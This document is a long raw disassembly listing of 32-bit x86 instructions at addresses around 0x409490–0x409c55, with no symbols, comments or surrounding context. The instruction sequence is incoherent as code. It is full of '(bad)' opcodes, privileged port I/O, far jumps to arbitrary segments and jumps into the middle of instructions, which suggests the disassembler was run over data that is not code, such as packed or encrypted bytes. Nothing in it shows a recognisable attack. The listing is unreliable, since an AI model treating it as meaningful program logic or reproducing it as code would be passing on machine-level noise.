  40948f:	vpxor  ymm4,ymm2,YMMWORD PTR [edx]
  409493:	or     al,0xf7
  409495:	rcl    ah,1
  409497:	jnp    0x409431
  409499:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40949b:	pop    esi
  40949c:	test   DWORD PTR [ecx+ebx*2+0x43],esp
  4094a0:	retf   
  4094a1:	shl    DWORD PTR [edx+0xb70ecf2],0x83
  4094a8:	dec    ecx
  4094a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094aa:	test   eax,0xa3f1e06
  4094af:	inc    ebx
  4094b0:	cmp    DWORD PTR [ecx+eiz*4+0x1d],0x66bf647f
  4094b8:	pop    esi
  4094b9:	jmp    FWORD PTR [ecx-0x5b]
  4094bc:	mov    edx,0xe9f4ba8b
  4094c1:	mov    ds:0x2c320289,eax
  4094c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094c7:	xlat   BYTE PTR ds:[ebx]
  4094c8:	fdiv   QWORD PTR [ebp+0x286438]
  4094ce:	inc    ecx
  4094cf:	and    BYTE PTR [edi],ch
  4094d1:	mov    bh,0x1a
  4094d3:	test   BYTE PTR [ebx-0x73],0x28
  4094d7:	cmp    eax,0x5ef12a8d
  4094dc:	std    
  4094dd:	js     0x4094b1
  4094df:	out    dx,al
  4094e0:	inc    eax
  4094e1:	cdq    
  4094e2:	mov    ch,0xfa
  4094e4:	cs aam 0x97
  4094e7:	and    cl,BYTE PTR [edx]
  4094e9:	cdq    
  4094ea:	add    al,0xe2
  4094ec:	test   BYTE PTR [edx-0x4f37d9b],bh
  4094f2:	mov    ebp,0x1d7d6b7c
  4094f7:	pop    ebp
  4094f8:	es mov ebp,0x1858356
  4094fe:	(bad)  
  4094ff:	cmp    eax,0xcb072ef2
  409504:	mov    ss,WORD PTR [eax]
  409506:	pop    ss
  409507:	inc    esp
  409508:	call   0x5763a6d3
  40950d:	in     eax,dx
  40950e:	jb     0x4094f6
  409510:	and    BYTE PTR [edi+0x6d],dh
  409513:	and    al,0x79
  409515:	sbb    dh,BYTE PTR [ebp+0x65]
  409518:	add    al,0xdd
  40951a:	xchg   BYTE PTR [eax],cl
  40951c:	out    0xfa,al
  40951e:	psllq  mm5,QWORD PTR [edi+0x1]
  409522:	jo     0x409553
  409524:	add    eax,0xcee4f4c0
  409529:	ror    DWORD PTR [esi+0x1cf47614],cl
  40952f:	push   ebx
  409530:	xchg   DWORD PTR [edi-0x73e4a552],esi
  409536:	push   edx
  409537:	sub    eax,0x35934bd
  40953c:	adc    DWORD PTR [eax-0x25],ecx
  40953f:	ds mov cl,0x9f
  409542:	push   esi
  409543:	adc    ebp,DWORD PTR [edi-0x1d8f138c]
  409549:	cs iret 
  40954b:	outs   dx,DWORD PTR ds:[esi]
  40954c:	and    al,0xd7
  40954e:	int3   
  40954f:	mov    ah,bh
  409551:	and    DWORD PTR [esi+0x444e5caf],0x35
  409558:	jno    0x4095a7
  40955a:	mov    ds:0x297a4f3c,al
  40955f:	and    al,0xf8
  409561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409562:	leave  
  409563:	jnp    0x4095e4
  409565:	push   esi
  409566:	jp     0x40959e
  409568:	and    esi,edx
  40956a:	jmp    0xada0e166
  40956f:	mov    bh,0xa1
  409571:	out    dx,al
  409572:	mov    al,0x79
  409574:	push   0xffffff8c
  409576:	mov    cl,0x9e
  409578:	jle    0x409598
  40957a:	inc    edi
  40957b:	retf   0xd237
  40957e:	mov    al,BYTE PTR [ebx-0x6b]
  409581:	mov    eax,0x80c6a620
  409586:	inc    edx
  409587:	pop    ds
  409588:	test   DWORD PTR [ecx+0x17],0xc8739fe4
  40958f:	pop    edi
  409590:	push   ss
  409591:	clc    
  409592:	loop   0x4095af
  409594:	xchg   ecx,eax
  409595:	ins    BYTE PTR es:[edi],dx
  409596:	aas    
  409597:	retf   0xe22d
  40959a:	jmp    0xd3b4cac6
  40959f:	mov    esi,0xef9decf2
  4095a4:	loopne 0x40952e
  4095a6:	cs mov edx,0x15e8b1b2
  4095ac:	push   cs
  4095ad:	dec    ebp
  4095ae:	icebp  
  4095af:	(bad)  
  4095b0:	cmp    dh,BYTE PTR [ecx+0x2bb39d65]
  4095b6:	adc    al,0x3f
  4095b8:	sub    al,0xc2
  4095ba:	push   ebp
  4095bb:	sub    al,cl
  4095bd:	pusha  
  4095be:	cmp    BYTE PTR [esi+eax*8],dl
  4095c1:	jno    0x4095a4
  4095c3:	xchg   edx,eax
  4095c4:	sbb    DWORD PTR [ebx-0x1b],esp
  4095c7:	bound  ecx,QWORD PTR [ebx-0x1c2aee9e]
  4095cd:	bnd ret 0xde94
  4095d1:	stc    
  4095d2:	push   ebp
  4095d3:	inc    edi
  4095d4:	inc    ebx
  4095d5:	inc    ecx
  4095d6:	push   ds
  4095d7:	pop    ss
  4095d8:	dec    ebx
  4095d9:	ss je  0x4095ca
  4095dc:	pop    ebx
  4095dd:	cs sub ch,ah
  4095e0:	outs   dx,DWORD PTR ds:[esi]
  4095e1:	push   esp
  4095e2:	ret    
  4095e3:	jp     0x4095c7
  4095e5:	xchg   cl,bh
  4095e7:	sbb    al,0x1b
  4095e9:	cmp    BYTE PTR [ecx+0x29],ah
  4095ec:	push   cs
  4095ed:	sub    esp,DWORD PTR [eax+0x4c]
  4095f0:	push   cs
  4095f1:	jmp    0x77d2:0xd96b731c
  4095f8:	shrd   DWORD PTR ds:0xe043,eax,cl
  4095fe:	inc    ecx
  4095ff:	retf   
  409600:	aas    
  409601:	icebp  
  409602:	shl    DWORD PTR [ecx-0x18],cl
  409605:	jbe    0x409639
  409607:	adc    BYTE PTR [ebp+ebp*2-0x17e97801],bl
  40960e:	imul   esp,DWORD PTR [eax+0x44],0x14f32771
  409615:	out    0x9d,al
  409617:	xchg   esi,eax
  409618:	arpl   WORD PTR [ecx-0x43],si
  40961b:	sbb    ch,BYTE PTR [eax+0x75]
  40961e:	inc    esi
  40961f:	mov    ah,0x7
  409621:	in     eax,0xda
  409623:	xor    esp,edi
  409625:	or     edx,esi
  409627:	pop    ebp
  409628:	xor    al,0xc6
  40962a:	mov    esi,0xfe2fa8f
  40962f:	ret    0x10be
  409632:	push   ss
  409633:	jg     0x409651
  409635:	lods   eax,DWORD PTR ds:[esi]
  409636:	popa   
  409637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409638:	pop    es
  409639:	iret   
  40963a:	xor    al,0xb2
  40963c:	js     0x409607
  40963e:	push   eax
  40963f:	out    dx,eax
  409640:	or     eax,0x95a23a8
  409645:	xor    dl,BYTE PTR [edi+0x6b]
  409648:	add    DWORD PTR [edi+0x25],edi
  40964b:	add    al,0xa2
  40964d:	jne    0x4095e1
  40964f:	mov    DWORD PTR [ebx+0x22],esi
  409652:	and    edx,DWORD PTR [eax+0x606478ea]
  409658:	enter  0x37c4,0xcd
  40965c:	mov    ds:0x6240f274,eax
  409661:	jecxz  0x40964c
  409663:	fidivr DWORD PTR [ebx+0xe]
  409666:	jecxz  0x4096a0
  409668:	mov    al,0x9a
  40966a:	pop    ebx
  40966b:	enter  0xa069,0xc9
  40966f:	jl     0x4095f5
  409671:	jno    0x4096c8
  409673:	lock jmp 0x5f08:0x77ab9ce1
  40967b:	jmp    0x8842f4c
  409680:	add    eax,0x892e6831
  409685:	dec    eax
  409686:	repnz pop eax
  409688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409689:	loope  0x4096c0
  40968b:	nop
  40968c:	imul   edx,DWORD PTR [esi+0x116a09ef],0xffffff86
  409693:	mov    ebp,0x6271696a
  409698:	and    al,0xb
  40969a:	add    esp,DWORD PTR [ebp+0x30a13185]
  4096a0:	xor    ah,al
  4096a2:	xor    al,0xfd
  4096a4:	or     DWORD PTR [ebx-0x1b],0xffffffff
  4096a8:	stc    
  4096a9:	outs   dx,DWORD PTR ds:[esi]
  4096aa:	fnstcw WORD PTR [edi-0x11e40f52]
  4096b0:	je     0x40971f
  4096b2:	xor    DWORD PTR [esp+ecx*4+0x40dec2c6],eax
  4096b9:	push   edx
  4096ba:	rol    DWORD PTR [edx+0x79],0x8d
  4096be:	scas   eax,DWORD PTR es:[edi]
  4096bf:	stos   DWORD PTR es:[edi],eax
  4096c0:	add    esi,0x59
  4096c3:	xchg   ebx,eax
  4096c4:	push   ss
  4096c5:	push   ds
  4096c6:	dec    ebx
  4096c7:	mov    eax,ds:0x118284c9
  4096cc:	or     eax,0x1e4cbf9a
  4096d1:	mov    dh,0x1d
  4096d3:	sub    edx,0x7944618a
  4096d9:	mov    bh,bl
  4096db:	ror    dl,0x83
  4096de:	or     esi,DWORD PTR [edx-0x15]
  4096e1:	push   es
  4096e2:	fucom  st(4)
  4096e4:	adc    eax,0x19be2612
  4096e9:	out    0x79,al
  4096eb:	popa   
  4096ec:	js     0x409721
  4096ee:	pop    esi
  4096ef:	retf   0x52fd
  4096f2:	mov    edx,0x2d8c040c
  4096f7:	retf   0x50e7
  4096fa:	push   ebx
  4096fb:	jl     0x409682
  4096fd:	jae    0x409755
  4096ff:	mov    ebp,0x66857da5
  409704:	xor    eax,0x3a188b91
  409709:	mov    eax,0x6aeed49f
  40970e:	jp     0x409783
  409710:	adc    esp,esi
  409712:	xchg   esp,eax
  409713:	jmp    DWORD PTR ds:0x1da1eeef
  409719:	or     ebx,DWORD PTR [edx+0x78eef777]
  40971f:	push   eax
  409720:	add    DWORD PTR [esi+ebx*1],esi
  409723:	loope  0x409725
  409725:	in     eax,0xe9
  409727:	add    eax,0xc13c4ab5
  40972c:	jns    0x40979f
  40972e:	pop    ecx
  40972f:	call   0x178c2674
  409734:	js     0x4096d3
  409736:	mul    DWORD PTR [edx+edx*8]
  409739:	push   ss
  40973a:	nop
  40973b:	adc    ah,ah
  40973d:	jo     0x409782
  40973f:	pop    es
  409740:	and    bl,BYTE PTR [ecx+0x7a]
  409743:	pop    edi
  409744:	cs mov ebx,0xc87a1b44
  40974a:	out    dx,al
  40974b:	enter  0x283d,0xe
  40974f:	pop    es
  409750:	shl    DWORD PTR [eax+0x2b],1
  409753:	mov    bl,0xfa
  409755:	pop    ebx
  409756:	jbe    0x409722
  409758:	loopne 0x4096ff
  40975a:	fiadd  DWORD PTR [esi+0xe95dc07]
  409760:	call   0xae9d1534
  409765:	adc    BYTE PTR [esi],ch
  409767:	mov    fs,WORD PTR [edx]
  409769:	xor    eax,0x18d36278
  40976e:	mul    BYTE PTR [ecx]
  409770:	pop    ebx
  409771:	mov    ecx,0x2d10f124
  409776:	(bad)  
  409777:	pop    ds
  409778:	sub    ch,cl
  40977a:	in     al,dx
  40977b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40977c:	sub    bh,BYTE PTR [ebx+0x7f]
  40977f:	pop    ecx
  409780:	and    bl,BYTE PTR [ecx]
  409782:	in     al,dx
  409783:	jo     0x40975d
  409785:	push   ss
  409786:	cdq    
  409787:	test   eax,0xeb6e8a7d
  40978c:	gs cmp ch,bh
  40978f:	mov    cl,0x4b
  409791:	push   0x7
  409793:	push   esp
  409794:	cs pop ebx
  409796:	mov    dh,al
  409798:	inc    ecx
  409799:	xor    cl,al
  40979b:	push   edx
  40979c:	dec    edx
  40979d:	xchg   DWORD PTR [ecx+0x5333554d],ebx
  4097a3:	fidivr WORD PTR [eax+0x4f1e2449]
  4097a9:	scas   eax,DWORD PTR es:[edi]
  4097aa:	adc    ecx,DWORD PTR [esp+ecx*2]
  4097ad:	mov    edx,0x18050453
  4097b2:	mov    edx,0xb04c72b4
  4097b7:	push   es
  4097b8:	pop    edi
  4097b9:	fst    st(6)
  4097bb:	jmp    0x65dd6f1d
  4097c0:	jmp    0x86a45e6
  4097c5:	retf   0xd2fe
  4097c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097c9:	or     DWORD PTR [ebx],edi
  4097cb:	push   ss
  4097cc:	out    dx,eax
  4097cd:	adc    eax,0xb7d2e21f
  4097d2:	adc    BYTE PTR ds:0xcf904a5b,al
  4097d8:	loop   0x409776
  4097da:	lods   eax,DWORD PTR ds:[esi]
  4097db:	jl     0x409835
  4097dd:	adc    ah,dh
  4097df:	stos   BYTE PTR es:[edi],al
  4097e0:	mov    edx,DWORD PTR [ebx-0x584476d7]
  4097e6:	mov    esp,0x742b7be1
  4097eb:	sub    BYTE PTR [eax],ch
  4097ed:	push   ebp
  4097ee:	sub    al,0xf6
  4097f0:	sub    ebp,edx
  4097f2:	ins    BYTE PTR es:[edi],dx
  4097f3:	es dec edi
  4097f5:	call   0xbd15bd09
  4097fa:	in     al,dx
  4097fb:	repnz int3 
  4097fd:	pushf  
  4097fe:	xchg   DWORD PTR [ebx+0x19],ecx
  409801:	push   0x44
  409803:	cmp    BYTE PTR [ebp-0x52a03891],0xb0
  40980a:	out    0x6,al
  40980c:	or     esi,esp
  40980e:	fldcw  WORD PTR [esp+esi*1-0x57]
  409812:	dec    ebp
  409813:	mov    edx,0xd58a3baf
  409818:	aaa    
  409819:	mov    DWORD PTR [ebp+0x2a4bc73c],edx
  40981f:	push   ss
  409820:	test   al,0x53
  409822:	mov    WORD PTR [esi],?
  409824:	push   ds
  409825:	add    edi,DWORD PTR [esi+0x5e]
  409828:	lods   eax,DWORD PTR ds:[esi]
  409829:	popf   
  40982a:	cmc    
  40982b:	sahf   
  40982c:	jp     0x40982f
  40982e:	mov    ds:0x1575089c,eax
  409833:	(bad)  
  409834:	mov    al,ds:0x28604321
  409839:	add    esp,edx
  40983b:	cdq    
  40983c:	mov    ecx,0x281ba73c
  409841:	sahf   
  409842:	cli    
  409843:	push   ss
  409844:	dec    esi
  409845:	cld    
  409846:	mov    edi,0x5bd832f3
  40984b:	std    
  40984c:	mov    ch,BYTE PTR [ebx+0x58]
  40984f:	rol    DWORD PTR [edi-0x7d],cl
  409852:	mov    ebx,0x6bc9b909
  409857:	jbe    0x4097f4
  409859:	(bad)  
  40985a:	mul    DWORD PTR [ebx+0x4b]
  40985d:	dec    eax
  40985e:	add    al,BYTE PTR [esi-0x46]
  409861:	(bad)  
  409862:	mov    edi,0xb2199213
  409867:	sahf   
  409868:	ss inc ebp
  40986a:	dec    edi
  40986b:	or     al,0xac
  40986d:	push   cs
  40986e:	mov    esp,0xd204cb34
  409873:	popa   
  409874:	into   
  409875:	mov    ds:0xf70a1cbe,eax
  40987a:	pushf  
  40987b:	xchg   BYTE PTR [edi+0x47],cl
  40987e:	mov    edx,DWORD PTR [edi+0x352eff41]
  409884:	push   0x12
  409886:	inc    esp
  409887:	cmp    al,0x11
  409889:	jns    0x4098c7
  40988b:	pop    eax
  40988c:	mov    eax,0x5a287729
  409891:	stos   BYTE PTR es:[edi],al
  409892:	repz iret 
  409894:	fdivr  st,st(7)
  409896:	push   esp
  409897:	push   ss
  409898:	call   0x503850cb
  40989d:	inc    edx
  40989e:	jne    0x4098eb
  4098a0:	sub    al,0x94
  4098a2:	adc    edi,DWORD PTR [ebx+0x24f95e38]
  4098a8:	add    edi,DWORD PTR [ecx+0x39]
  4098ab:	lods   eax,DWORD PTR ds:[esi]
  4098ac:	add    al,0x23
  4098ae:	aas    
  4098af:	(bad)  
  4098b1:	mov    dx,0x3c7
  4098b5:	push   0x4459e664
  4098ba:	mov    DWORD PTR [eax-0x28],0x39123b6c
  4098c1:	es mov dl,0xbd
  4098c4:	test   eax,0x63c8e1eb
  4098c9:	mov    bl,cl
  4098cb:	addr16 icebp 
  4098cd:	jns    0x4098f3
  4098cf:	nop
  4098d0:	xchg   esi,eax
  4098d1:	sbb    BYTE PTR ds:0x989b8222,cl
  4098d7:	or     al,0x65
  4098d9:	mov    bl,0xb1
  4098db:	sti    
  4098dc:	add    eax,0xd4bdc44f
  4098e1:	daa    
  4098e2:	mov    cl,0x58
  4098e4:	xchg   ebx,eax
  4098e5:	inc    ecx
  4098e6:	inc    esp
  4098e7:	and    DWORD PTR [ecx],ecx
  4098e9:	out    0x5b,al
  4098eb:	(bad)  
  4098ec:	adc    ecx,DWORD PTR [eax+esi*8]
  4098ef:	lahf   
  4098f0:	leave  
  4098f1:	mov    WORD PTR [esp+ebp*4-0x71],cs
  4098f5:	pop    ebp
  4098f6:	leave  
  4098f7:	add    BYTE PTR [ebx],bh
  4098f9:	cmp    DWORD PTR [ecx+0x75],edi
  4098fc:	cli    
  4098fd:	add    BYTE PTR [ecx+0x3f53bee1],0xaf
  409904:	lock xor ah,BYTE PTR [ebx+edi*4+0x767a7ad9]
  40990c:	mov    dh,0xa6
  40990e:	xchg   esp,eax
  40990f:	cli    
  409910:	mov    ah,0x87
  409912:	dec    edx
  409913:	or     ah,BYTE PTR [esi]
  409915:	mov    al,0x7b
  409917:	stos   BYTE PTR es:[edi],al
  409918:	(bad)  
  409919:	sbb    ecx,edx
  40991b:	icebp  
  40991c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40991d:	ins    BYTE PTR es:[edi],dx
  40991e:	cld    
  40991f:	repz and BYTE PTR [ebp-0x1e],ch
  409923:	push   cs
  409924:	push   es
  409925:	or     ebp,DWORD PTR [edi-0x1c]
  409928:	into   
  409929:	xchg   ebx,eax
  40992b:	and    BYTE PTR [esi+0x5108f0d8],bh
  409931:	dec    eax
  409932:	xor    al,0xd0
  409934:	(bad)  
  409936:	scas   al,BYTE PTR es:[edi]
  409937:	xchg   esp,eax
  409938:	sub    eax,DWORD PTR [ecx]
  40993a:	ret    0x72f
  40993d:	fmul   st(6),st
  40993f:	xor    dh,BYTE PTR [ecx]
  409941:	ja     0x40997b
  409943:	je     0x409969
  409945:	test   eax,0x73307089
  40994a:	pop    ds
  40994b:	lea    eax,[edi-0x659ac0e0]
  409951:	lods   al,BYTE PTR ds:[esi]
  409952:	addr16 mov al,ds:0xae00
  409956:	jnp    0x4098f3
  409958:	bound  esp,QWORD PTR [ebx+ecx*8]
  40995b:	loop   0x409987
  40995d:	pop    ss
  40995e:	in     al,dx
  40995f:	or     bl,BYTE PTR [ebx+ecx*1]
  409962:	mov    al,0xf2
  409964:	push   eax
  409965:	adc    DWORD PTR [ebp+0x3d],ecx
  409968:	and    edx,DWORD PTR [edi-0x4ff8f029]
  40996e:	jmp    0x409908
  409970:	fwait
  409971:	adc    DWORD PTR [eax],esp
  409973:	push   edx
  409974:	call   0xfa0d:0x1000bb87
  40997b:	add    eax,0xe4bd80e4
  409980:	sub    al,BYTE PTR [ecx]
  409982:	call   0x6850:0x2165519c
  409989:	cmp    ecx,ebp
  40998b:	push   ebp
  40998c:	pop    ds
  40998d:	xchg   edx,eax
  40998e:	cmp    eax,0x653d1ccd
  409993:	xchg   ecx,eax
  409994:	push   edi
  409995:	jg     0x409929
  409997:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409998:	fistp  DWORD PTR [edi-0x5ba95f77]
  40999e:	iret   
  40999f:	sbb    DWORD PTR [edi+0x5a],ecx
  4099a2:	sub    DWORD PTR [edi-0x5d632958],edx
  4099a8:	or     edi,DWORD PTR [eax+ebx*4-0x44]
  4099ac:	mov    ebx,0x43edf305
  4099b1:	xor    esp,eax
  4099b3:	adc    bh,BYTE PTR [eax+0x2e]
  4099b6:	ret    
  4099b7:	in     eax,dx
  4099b8:	xor    BYTE PTR [ebx-0x7ac66a8b],bh
  4099be:	mov    eax,ds:0xf4b21324
  4099c3:	outs   dx,BYTE PTR ds:[esi]
  4099c4:	std    
  4099c5:	mov    ebx,DWORD PTR [ebx+0x405183c4]
  4099cb:	xor    eax,0xca6ed5
  4099d0:	ins    DWORD PTR es:[edi],dx
  4099d1:	lock pop edi
  4099d3:	pusha  
  4099d4:	in     al,dx
  4099d5:	lds    eax,FWORD PTR [eax]
  4099d7:	push   0xc7390592
  4099dc:	cmp    eax,0x8ae486e8
  4099e1:	push   ecx
  4099e2:	xchg   edi,eax
  4099e3:	mov    ds:0x9d9ae7c3,eax
  4099e8:	data16 je 0x40999c
  4099eb:	(bad)  
  4099ec:	cmp    al,0xfc
  4099ee:	loope  0x4099ae
  4099f0:	std    
  4099f1:	test   BYTE PTR [eax],dl
  4099f3:	sub    ebp,DWORD PTR [edx+0x7850d2d8]
  4099f9:	xor    BYTE PTR [ebp-0x7e836a55],al
  4099ff:	mov    ds:0xeb44945,eax
  409a04:	fcom   QWORD PTR [edi]
  409a06:	xchg   esi,eax
  409a07:	sub    al,0x4d
  409a09:	cwde   
  409a0a:	mov    ss,WORD PTR [edx+0x15518fd0]
  409a10:	ss inc ecx
  409a12:	cmp    DWORD PTR [ebp-0x4f9a53c],ebx
  409a18:	or     eax,0xb380b3ee
  409a1d:	data16 clc 
  409a1f:	js     0x409a49
  409a21:	mov    al,0x1a
  409a23:	lds    eax,FWORD PTR [esp+ebp*8-0xe]
  409a27:	aaa    
  409a28:	not    BYTE PTR ds:0x69f9ae6b
  409a2e:	sbb    al,0x67
  409a30:	and    al,0x17
  409a32:	fwait
  409a33:	mov    dh,0x2b
  409a35:	les    edx,FWORD PTR [ebx-0x16]
  409a38:	rcr    cl,0xc8
  409a3b:	into   
  409a3c:	mov    dh,0x8d
  409a3e:	int3   
  409a3f:	sbb    DWORD PTR [ebx+esi*8-0x66e8f21b],eax
  409a46:	sar    BYTE PTR [ecx],cl
  409a48:	jns    0x4099e1
  409a4a:	lods   eax,DWORD PTR ds:[esi]
  409a4b:	in     al,dx
  409a4c:	fild   DWORD PTR [ecx+0x56042607]
  409a52:	fstp   DWORD PTR [edi-0x45]
  409a55:	jg     0x409a02
  409a57:	ins    BYTE PTR es:[edi],dx
  409a58:	sbb    DWORD PTR [edx+esi*8-0x56],esi
  409a5c:	retf   
  409a5d:	adc    BYTE PTR [eax+0x2f],al
  409a60:	mov    DWORD PTR [edx+0x1d86f615],eax
  409a66:	jmp    0x409ae4
  409a68:	(bad)  [edx-0x2cb60fa7]
  409a6e:	dec    eax
  409a6f:	es js  0x409a82
  409a72:	scas   al,BYTE PTR es:[edi]
  409a73:	pop    ecx
  409a74:	shl    BYTE PTR ds:0x6b668cb4,1
  409a7a:	push   esp
  409a7b:	sbb    al,0xe7
  409a7d:	adc    dl,BYTE PTR [eax+0x3a]
  409a80:	loop   0x409a19
  409a82:	or     esi,DWORD PTR ds:0x8dcf6985
  409a88:	fadd   DWORD PTR [ecx+0x5cfd4739]
  409a8e:	mov    edi,0xce8e693
  409a93:	inc    edi
  409a94:	test   BYTE PTR [ecx-0x15b3dd8b],dl
  409a9a:	(bad)
  409a9d:	or     edi,esp
  409a9f:	sti    
  409aa0:	jnp    0x409a7a
  409aa2:	(bad)  
  409aa3:	dec    edx
  409aa4:	and    edx,DWORD PTR [edi+0x33]
  409aa7:	push   ebp
  409aa8:	scas   al,BYTE PTR es:[edi]
  409aa9:	jb     0x409af9
  409aab:	xlat   BYTE PTR ds:[ebx]
  409aac:	dec    esi
  409aad:	shl    DWORD PTR [esp+edi*2-0x5e6dc704],1
  409ab4:	(bad)  
  409ab5:	pusha  
  409ab6:	ss retf 
  409ab8:	xlat   BYTE PTR ds:[ebx]
  409ab9:	add    al,0x45
  409abb:	xchg   ebx,eax
  409abd:	sub    BYTE PTR [edx],ch
  409abf:	cs dec edi
  409ac1:	mov    ds:0x72c8c2de,eax
  409ac6:	pop    edi
  409ac7:	or     eax,DWORD PTR [ebp+0x2b]
  409aca:	and    esi,DWORD PTR [eax]
  409acc:	pop    es
  409acd:	sahf   
  409ace:	(bad)  
  409acf:	mov    ebp,0x7aec7a06
  409ad4:	add    al,0x63
  409ad6:	lods   al,BYTE PTR ds:[esi]
  409ad7:	fisub  DWORD PTR [ebx-0x75]
  409ada:	xchg   ebp,eax
  409adb:	retf   0x4ef5
  409ade:	fiadd  DWORD PTR [esi-0x22]
  409ae1:	call   0xf25b:0xee8071aa
  409ae8:	nop
  409ae9:	fist   WORD PTR [eax-0x3f]
  409aec:	or     DWORD PTR [ecx-0x8a78eb],0xfffffff5
  409af3:	stos   DWORD PTR es:[edi],eax
  409af4:	repnz cli 
  409af6:	(bad)  
  409af7:	sbb    DWORD PTR [edi-0x3b],edx
  409afa:	repz into 
  409afc:	loop   0x409b0f
  409afe:	cli    
  409aff:	outs   dx,BYTE PTR ds:[esi]
  409b00:	mov    al,0xc8
  409b02:	add    BYTE PTR [ebp-0x36],al
  409b05:	pop    eax
  409b06:	fnstsw WORD PTR [edi+0x421729e2]
  409b0c:	add    DWORD PTR [eax],eax
  409b0e:	and    BYTE PTR [edi+edi*4-0x6c],cl
  409b12:	jns    0x409b0b
  409b14:	ins    DWORD PTR es:[edi],dx
  409b15:	and    DWORD PTR [edx-0x2a],0xffffffb9
  409b19:	inc    esi
  409b1a:	(bad)  
  409b1b:	or     bl,BYTE PTR cs:[ecx-0x39]
  409b1f:	int    0x27
  409b21:	jl     0x409b6d
  409b23:	mov    bh,0xba
  409b25:	pop    edx
  409b26:	and    ebx,DWORD PTR [eax+ecx*1-0x31]
  409b2a:	(bad)  
  409b2c:	fs popa 
  409b2e:	test   BYTE PTR [ebp+esi*8-0x31a49a31],ah
  409b35:	out    dx,eax
  409b36:	jecxz  0x409b53
  409b38:	mov    esi,0x976798a2
  409b3d:	outs   dx,BYTE PTR ds:[esi]
  409b3e:	cmpxchg BYTE PTR [eax],bh
  409b41:	(bad)  
  409b42:	adc    BYTE PTR [edi-0xe],bl
  409b45:	or     DWORD PTR [ecx*1+0x6b30fd2],ebp
  409b4c:	pop    ds
  409b4d:	stos   DWORD PTR es:[edi],eax
  409b4e:	jb     0x409b26
  409b50:	or     dl,BYTE PTR [ecx+ebp*4+0x6]
  409b54:	adc    BYTE PTR [ecx],bh
  409b56:	shr    BYTE PTR [edx],1
  409b58:	jg     0x409bc6
  409b5a:	jae    0x409b54
  409b5c:	cli    
  409b5d:	pop    ebx
  409b5e:	xchg   ebp,eax
  409b5f:	adc    DWORD PTR [ebp-0x2ce7e6fc],eax
  409b65:	in     al,dx
  409b66:	loope  0x409bb8
  409b68:	inc    ebp
  409b69:	shl    DWORD PTR [eax],cl
  409b6b:	cmp    BYTE PTR [edx+0x7],dl
  409b6e:	je     0x409bb8
  409b70:	xor    BYTE PTR [ecx-0x70],0x1e
  409b74:	adc    edx,DWORD PTR [ebp-0x3415424e]
  409b7a:	loopne 0x409b29
  409b7c:	and    eax,eax
  409b7e:	xchg   eax,esp
  409b80:	imul   ecx,esi,0xffffffee
  409b83:	aam    0xe6
  409b85:	fs pushf 
  409b87:	cwde   
  409b88:	mov    bl,0xd8
  409b8a:	lock fadd st,st(2)
  409b8d:	push   esp
  409b8e:	jno    0x409bb7
  409b90:	jns    0x409b45
  409b92:	jnp    0x409bfe
  409b94:	jp     0x409b72
  409b96:	retf   
  409b97:	loop   0x409beb
  409b99:	nop
  409b9a:	sub    bl,BYTE PTR [ebx+0xda4dd6f]
  409ba0:	test   dl,0xc7
  409ba3:	xchg   edx,eax
  409ba4:	xor    edi,DWORD PTR [edi+0x21]
  409ba7:	cmp    DWORD PTR [eax],ebx
  409ba9:	in     al,0xe0
  409bab:	jg     0x409c1c
  409bad:	pop    ss
  409bae:	das    
  409baf:	ins    DWORD PTR es:[edi],dx
  409bb0:	jle    0x409bb7
  409bb2:	nop
  409bb3:	push   edx
  409bb4:	mov    BYTE PTR [esi],ah
  409bb6:	mov    ds:0xb09dad45,eax
  409bbb:	xchg   esp,eax
  409bbc:	or     eax,0xb6a74aef
  409bc1:	jge    0x409bdd
  409bc3:	rcl    BYTE PTR ds:0x58b03f43,cl
  409bc9:	loop   0x409c49
  409bcb:	(bad)  
  409bcc:	mov    ebx,0x387819e8
  409bd1:	xor    BYTE PTR [ebp-0x758349e],dh
  409bd7:	xchg   dl,dl
  409bd9:	mov    ch,0x4d
  409bdb:	mov    eax,0xbe939777
  409be0:	inc    ebx
  409be1:	imul   DWORD PTR [esi+0x7e]
  409be4:	shl    BYTE PTR [ebx],1
  409be6:	hlt    
  409be7:	outs   dx,DWORD PTR ds:[esi]
  409be8:	retf   0x1015
  409beb:	pop    edi
  409bec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bed:	mov    al,0x6b
  409bef:	mov    bh,0xae
  409bf1:	or     BYTE PTR [eax],dl
  409bf3:	jle    0x409c6c
  409bf5:	fucom  st(0)
  409bf7:	lods   al,BYTE PTR ds:[esi]
  409bf8:	push   edx
  409bf9:	mov    ecx,0x556e9386
  409bfe:	das    
  409bff:	les    esp,FWORD PTR [edx-0x6]
  409c02:	jo     0x409c28
  409c04:	jge    0x409c46
  409c06:	inc    edx
  409c07:	ja     0x409c82
  409c09:	mov    ecx,0xb1df9e13
  409c0e:	out    dx,al
  409c0f:	cmp    ch,BYTE PTR [ebx-0x20]
  409c12:	jge    0x409bec
  409c14:	dec    esi
  409c15:	mov    al,ds:0xc432db4f
  409c1a:	adc    DWORD PTR [eax],eax
  409c1c:	sbb    dh,BYTE PTR [edi+0x11174761]
  409c22:	xor    eax,DWORD PTR [edi]
  409c24:	add    al,0xf6
  409c26:	xlat   BYTE PTR ds:[ebx]
  409c27:	ja     0x409c0c
  409c29:	mov    eax,ds:0xdff68cec
  409c2e:	xor    al,0xe3
  409c30:	lods   eax,DWORD PTR ds:[esi]
  409c31:	aaa    
  409c32:	test   eax,0xe3965870
  409c37:	xor    eax,DWORD PTR [esp+ebx*8-0x4cb03e38]
  409c3e:	cld    
  409c3f:	or     DWORD PTR [ebx],esp
  409c41:	mov    bl,0x2f
  409c43:	repnz pop eax
  409c45:	cld    
  409c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c47:	and    ebp,DWORD PTR [eax+ebx*4-0x733fc788]
  409c4e:	add    eax,0xe250ea9f
  409c53:	push   ss
  409c54:	inc    eax
  409c55:	mov    ah,0xe5
